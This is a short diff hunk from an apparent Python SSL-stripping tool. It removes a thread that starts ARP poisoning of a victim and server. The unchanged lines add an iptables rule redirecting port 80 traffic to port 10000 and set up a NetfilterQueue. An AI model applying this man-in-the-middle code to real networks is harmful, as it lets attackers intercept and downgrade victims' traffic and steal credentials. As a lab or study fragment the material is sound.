@@ -28,10 +28,6 @@ def process_packet(packet):
 
 def ssl_strip(interface):
 
-    # Start ARP poisoning in a separate thread
-    arp_thread = threading.Thread(target=arp_poison.arp_poison, args=(ipVictim, macVictim, ipServer, macAttacker, interface))
-    arp_thread.start()
-
 
     os.system("iptables -t nat -A PREROUTING -i {} -p tcp --destination-port 80 -j REDIRECT --to-port 10000".format(interface))
     queue = NetfilterQueue()
